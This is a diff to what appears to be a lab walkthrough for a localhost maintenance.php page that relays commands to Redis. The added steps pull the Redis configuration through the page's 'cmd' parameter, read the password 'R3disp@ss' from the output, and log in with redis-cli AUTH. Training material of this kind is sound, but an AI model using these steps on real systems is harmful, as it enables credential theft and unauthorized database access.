@@ -85,7 +85,17 @@ maintenance page to view the source code for the index page?
 	curl http://localhost/maintenance.php?cmd=help
 	curl http://localhost/maintenance.php?cmd=mget,example1
 ~~~
-- Step 3: "curl http://localhost/maintenance.php?cmd=info" 
+- Step 3: "curl http://localhost/maintenance.php?cmd=config,get,*"
+- Step 4: Notice this in the output:
+~~~
+dbfilename
+dump.rdb
+requirepass
+R3disp@ss
+masterauth
+~~~
+- Step 5: "redis-cli"
+- Step 6: AUTH R3disp@ss
 
 
 
